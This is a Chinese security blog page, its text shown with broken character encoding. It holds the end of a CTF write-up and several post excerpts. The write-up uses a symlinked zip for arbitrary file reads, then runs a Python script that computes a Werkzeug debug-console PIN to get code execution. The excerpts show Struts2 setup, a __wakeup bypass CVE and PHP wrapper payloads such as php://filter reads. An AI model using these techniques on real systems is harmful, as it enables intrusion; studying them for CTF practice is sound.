<p>æ€»ç»“å°±æ˜¯ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åè§£å‹ï¼Œå¹¶ä¸”åœ¨è®¿é—®æ–‡ä»¶æ—¶é€šè¿‡<code>../</code>æ¥æ‰§è¡Œç›®å½•ç©¿è¶Šï¼Œæ²¡å…³ç³»æˆ‘ä»¬ç›´æ¥ç”¨è½¯è¿æ¥<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847624.png"></p>
<p>å¯ä»¥çœ‹åˆ°xæ—¶ä¸€ä¸ªæŒ‡å‘æ ¹ç›®å½•çš„è½¯è¿æ¥ï¼Œå‹ç¼©ï¼Œä¸Šä¼ ï¼Œè®¿é—®ï¼Œç›®å½•ç©¿è¶Šå¯ä»¥è¿›è¡Œä»»æ„çš„æ–‡ä»¶è¯»å–äº†</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847477.png">ä½†æ˜¯è¿™æ—¶å€™æˆ‘ä»¬ç›´æ¥ç‚¹å‡»flagå‘ç°æ— æ³•è¯»å–å¹¶ä¸”æŠ¥é”™ï¼Œå¯èƒ½æ²¡æœ‰æƒé™å¹¶ä¸”debugæ¨¡å¼æ˜¯å¼€å¯çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡è®¡ç®—PINå€¼æ‰“å¼€consoleæ¥RCE<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171849327.png"></p>
<p>æ‰€éœ€çš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>/sys/class/net/eth0/address</p>
<p>/etc/machine-id </p>
<p>/proc/sys/kernel/random/boot_id #æœ¬é¢˜ç¯å¢ƒå­˜åœ¨machine-idæ‰€ä»¥ä¸éœ€è¦boot_idäº†</p>
<p>/proc/self/cgroup</p>
</blockquote>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171857744.png"></p>
<p>ä½¿ç”¨è„šæœ¬æ¥è®¡ç®—PINå€¼</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;95532648517&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">		<span class="string">&#x27;96cec10d3d9307792745ec3b85c896207445bfc71ac17f0f2e5d5488c55c3346ea36da9d417b8f57364ddc5081f3f9b1&#x27;</span><span class="comment">#  /etc/machine-id+/proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171853259.png"></p>
<p>ç›´æ¥è®¿é—®/console RCE</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171854614.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fd00724-65fe-4c1c-a13d-83b4fc68c8aa&#125;</span><br></pre></td></tr></table></div></figure>





<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/fa1bef6e.html">ChainFlagè®°å½•</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/fa1bef6e.html" data-flag-title="ChainFlagè®°å½•"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/38f24cfd.html">Java jsp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/38f24cfd.html" data-flag-title="Java jsp"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/bba236ad.html">Java Struts2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/bba236ad.html" data-flag-title="Java Struts2"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h2 id="å…¥é—¨"   >
          <a href="#å…¥é—¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…¥é—¨" class="headerlink" title="å…¥é—¨"></a>å…¥é—¨</h2>
      
        <h3 id="åˆ›å»ºStruts2é¡¹ç›®"   >
          <a href="#åˆ›å»ºStruts2é¡¹ç›®" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ›å»ºStruts2é¡¹ç›®" class="headerlink" title="åˆ›å»ºStruts2é¡¹ç›®"></a>åˆ›å»ºStruts2é¡¹ç›®</h3>
      <p>é¦–å…ˆé€šè¿‡WEB-INFä¸‹çš„ç›®å½•è¿›è¡ŒURLåŒ¹é…æ¥å®ç°Struts2æ¡†æ¶çš„è°ƒç”¨ï¼Œè€Œå…·ä½“çš„URLåŒ¹é…çš„ç±»å°±è¦äº¤ç»™resourceä¸‹çš„struts.xmlæ¥æ‰§è¡Œäº†</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--struts.xmlç¤ºä¾‹--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;</span><br><span class="line">        &quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">		&lt;!--packageåŒ…æ ‡å‡†æ¨¡ç‰ˆ--&gt;</span><br><span class="line">    &lt;package name=&quot;default&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">				&lt;!--nameä¸ºURLåŒ¹é…è§„åˆ™ï¼Œclassä¸ºåŒ¹é…åæŒ‡å‘çš„ç±»--&gt;</span><br><span class="line">				&lt;action name=&quot;hello&quot; class=&quot;action.HelloAction&quot;&gt;</span><br><span class="line">						&lt;!--resultæ­¤å¤„å¤„ç†ç±»è¿”å›ç»“æœå†…å®¹ï¼Œç¨åä¼šæåˆ°--&gt;</span><br><span class="line">            &lt;result name=&quot;success&quot;&gt;index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--web.xmlç¤ºä¾‹--&gt;</span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line">&lt;!--struts2å…¥å£--&gt;</span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="Scriptlet"   >
          <a href="#Scriptlet" class="heading-link"><i class="fas fa-link"></i></a><a href="#Scriptlet" class="headerlink" title="Scriptlet"></a>Scriptlet</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%        %&gt;ï¼šjavaè„šæœ¬æ®µï¼Œå¯ä»¥å®šä¹‰å±€éƒ¨å˜é‡ï¼Œç¼–å†™è¯­å¥</span><br><span class="line">&lt;%!       %&gt;ï¼šå£°æ˜ï¼Œå¯ä»¥å®šä¹‰å…¨å±€æˆ–æˆå‘˜å˜é‡ï¼Œæ–¹æ³•ï¼Œç±»</span><br><span class="line">&lt;%=       %&gt;ï¼šè¡¨è¾¾å¼ï¼Œæ•°æ®ä¸€ä¸ªå˜é‡æˆ–å…·ä½“å†…å®¹</span><br></pre></td></tr></table></div></figure>

<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/95491106.html">PHP Trick</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-08-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/95491106.html" data-flag-title="PHP Trick"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="PHP-Trick"   >
          <a href="#PHP-Trick" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-Trick" class="headerlink" title="PHP Trick"></a>PHP Trick</h1>
      
        <h2 id="ååºåˆ—åŒ–"   >
          <a href="#ååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2>
      <p>é¦–å…ˆè‚¯å®šè¦æŠŠæ‰€æœ‰çš„é­”æœ¯æ–¹æ³•çœ‹ä¸€çœ‹å•¦</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__construct() 	æ„é€ å‡½æ•°</span><br><span class="line">__destruct()  	ææ„å‡½æ•°</span><br><span class="line">__call()				åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__callStatic()	åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__get()					è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__set()					åœ¨ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__isset()				å½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ <span class="keyword">isset</span>() æˆ– <span class="keyword">empty</span>() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__unset()				å½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ <span class="keyword">unset</span>() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨</span><br><span class="line">__sleep()				å½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨__sleep()æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</span><br><span class="line">__wakeup() 			å½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨__wakeup()æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</span><br><span class="line">__serialize()		å’Œ__sleep()æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ</span><br><span class="line">__unserialize() å’Œ__wakeup()æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ</span><br><span class="line">__toString()		__toString()æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ï¼Œåªèƒ½è¿”å›å­—ç¬¦ä¸²ä¸ç„¶ä¼šé£™é”™</span><br><span class="line">__invoke()			å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span><br><span class="line">__set_state()		å½“è°ƒç”¨ var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</span><br><span class="line">__clone()				å¯¹è±¡å¤åˆ¶å¯ä»¥é€šè¿‡ <span class="keyword">clone</span> å…³é”®å­—æ¥å®Œæˆï¼ˆå¦‚æœå¯èƒ½ï¼Œè¿™å°†è°ƒç”¨å¯¹è±¡çš„ __clone() æ–¹æ³•ï¼‰ã€‚</span><br><span class="line">__debugInfo()		å½“é€šè¿‡ var_dump() è½¬å‚¨å¯¹è±¡ï¼Œè·å–åº”è¯¥è¦æ˜¾ç¤ºçš„å±æ€§çš„æ—¶å€™ï¼Œ è¯¥å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ã€‚å¦‚æœå¯¹è±¡ä¸­æ²¡æœ‰	å®šä¹‰è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šå±•ç¤ºæ‰€æœ‰çš„å…¬æœ‰ã€å—ä¿æŠ¤å’Œç§æœ‰çš„å±æ€§ã€‚</span><br></pre></td></tr></table></div></figure>


        <h3 id="wakeup"   >
          <a href="#wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3>
      <p>ç»å…¸çš„CVEç»•è¿‡wakeupæ–¹æ³•<strong>CVE-2016-7124</strong></p>
<p>å½±å“èŒƒå›´ï¼š</p>
<p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
<p>åªéœ€è¦æ„é€ å‡ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å¹¶å°†å±æ€§æ•°æ”¹ä¸ºå¤§äºçœŸå®å±æ€§æ•°å³å¯</p>

        <h3 id="destruct"   >
          <a href="#destruct" class="heading-link"><i class="fas fa-link"></i></a><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3>
      <p>å¯¹äºphpç‰ˆæœ¬åœ¨8.0ä»¥ä¸‹çš„ï¼Œåªè¦è®©ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šæ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>die</code>æ–¹æ³•å®æƒ æ­£å¸¸è¿›è¡Œåƒåœ¾å›æ”¶å¹¶è§¦å‘<code>__destruct()</code>æ–¹æ³•çš„</p>

        <h3 id="call-ï¼ˆ-callStatic-ï¼‰"   >
          <a href="#call-ï¼ˆ-callStatic-ï¼‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#call-ï¼ˆ-callStatic-ï¼‰" class="headerlink" title="__call()ï¼ˆ__callStatic()ï¼‰"></a>__call()ï¼ˆ__callStatic()ï¼‰</h3>
      <p>å…ˆæ¥çœ‹ä»¥ä¸‹callçš„å®˜æ–¹è¯´æ˜æ ¼å¼</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$function_name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³•ä½“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ä½ ä¼ ä¸€ä¸ªå‚æ•°ä¹Ÿå¥½å¤šä¸ªå‚æ•°ä¹Ÿç½¢ï¼Œè¿™äº›å†…å®¹éƒ½ä¼šè¢«ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨èµ·æ¥ï¼Œæ‰€ä»¥åœ¨<code>__call()</code>æ–¹æ³•ä¸­è°ƒç”¨å‚æ•°å†…å®¹æ—¶ä¸€å®šä¸€å®šè¦æŒ‰ç…§arrayçš„å½¢å¼è°ƒç”¨</p>

        <h2 id="URLè§£æ"   >
          <a href="#URLè§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#URLè§£æ" class="headerlink" title="URLè§£æ"></a>URLè§£æ</h2>
      
        <h2 id="æ–‡ä»¶åŒ…å«"   >
          <a href="#æ–‡ä»¶åŒ…å«" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2>
      <p>å¾ˆé‡è¦çš„ä¸€å®šæ˜¯å„ç§ä¼ªåè®®äº†</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file://	ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œä¸å—allow_url_fopenå’Œallow_url_includeå½±å“</span><br><span class="line">data://[&lt;MIME-type&gt;][;cherset=&lt;encoding&gt;][;base64],&lt;data&gt;	å¯ä»¥ç›´æ¥å¾€é‡Œé¢æ”¾å†…å®¹</span><br><span class="line">zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]	å¯ä»¥ç›´æ¥è¯»å–å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶</span><br><span class="line">php://input	ç›´æ¥è¯»å–è¯·æ±‚ä½“çš„æ‰€æœ‰å†…å®¹</span><br><span class="line">php://output	çº¯å†™å…¥ä¸ªäººæ„Ÿè§‰è¿˜æ²¡å•¥å¤§ç”¨</span><br><span class="line">php://fd		åŒ…å«æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„æ–‡ä»¶</span><br><span class="line">php://memory	è¯»å†™å†…å­˜çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæ²¡æ„Ÿè§‰æœ‰å•¥åˆ©ç”¨æ–¹æ³•ï¼ˆ</span><br><span class="line">php://temp		ä¸Šé¢çš„å‡çº§ç‰ˆï¼Œåœ¨ä¸´æ—¶æ–‡ä»¶&gt;2MBæ—¶å°±ä¼šä»å†…å­˜ä¸­æ‹‰å‡ºæ¥å˜æˆåœ¨é»˜è®¤sys_get_temp_dirç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">php://filter	æ–‡ä»¶è¯»å–è¿‡æ»¤å™¨</span><br><span class="line">phar://	å°±æ˜¯pharå•Šä½ è¿˜æƒ³è¦ä»€ä¹ˆï¼ˆå…¶å®ä¹Ÿå¯ä»¥å’Œzipä¸€æ ·è¯»å–å‹ç¼©åŒ…å†…å®¹ï¼‰</span><br></pre></td></tr></table></div></figure>


        <h3 id="php-filter"   >
          <a href="#php-filter" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3>
      <p>æœ€èƒ½ç©å‡ºèŠ±æ¥çš„ä¸€ä¸ªåè®®ï¼Œæœ€åŸºç¡€çš„å½“ç„¶æ˜¯base64è¯»å–äº†</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></div></figure>

<p>ä¸­é—´convertå¯ç”¨çš„å†…å®¹æœ‰</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.quoted-printable-encode	å°†æ–‡æœ¬ä¸­çš„ä¸å¯è§å­—ç¬¦è½¬æ¢ä¸ºå¯æ‰“å°çš„å­—ç¬¦è¿›è¡Œè¾“å‡º</span><br><span class="line">convert.quoted-printable-decode ä¸Šè¿°é€†è¿‡ç¨‹</span><br></pre></td></tr></table></div></figure>

<p>è¯´å®è¯è¿˜æ²¡æ€ä¹ˆè§è¿‡è¿™ä¸ªç”¨æ³•ï¼Œ<del>å€’ä¹Ÿç¡®å®æ²¡å•¥åµç”¨</del></p>
<p>å…¶ä¸­å¯ç”¨çš„æœ€å¤šçš„å°±æ˜¯è¿™ä¸ª</p>
